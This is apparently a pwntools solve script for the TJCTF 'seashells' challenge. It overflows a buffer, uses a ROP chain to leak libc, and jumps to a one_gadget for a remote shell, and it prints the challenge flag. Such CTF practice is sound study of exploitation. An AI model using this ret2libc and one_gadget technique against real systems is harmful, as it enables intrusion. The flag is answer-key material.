from pwn import *

r = remote('p1.tjctf.org', 8009)
#r = process('./seashells')

offset = 18
pop_rdi = 0x400803
shell_addr = 0x4006c7
main_addr = 0x4006f2

payload = ""
payload += "A"*offset

payload += p64(pop_rdi)
payload += p64(0x600fe8)
payload += p64(0x4005a0)
payload += p64(main_addr)

r.recvuntil('shell?')
r.sendline(payload)

r.recvuntil('here?\n')
leak = u64(r.recvline().strip().ljust(8,"\x00"))

libc_base = leak - 0x0800b0
system_addr = libc_base + 0x04f440

payload = ""
payload += "A"*(offset)
payload += p64(libc_base + 0x10a38c)

r.recvuntil('shell?')
r.sendline(payload)

r.interactive()

# one_gadget worked lol - libc6_2.27-3ubuntu1_amd64 
# flag: tjctf{she_s3lls_se4_sh3ll5}
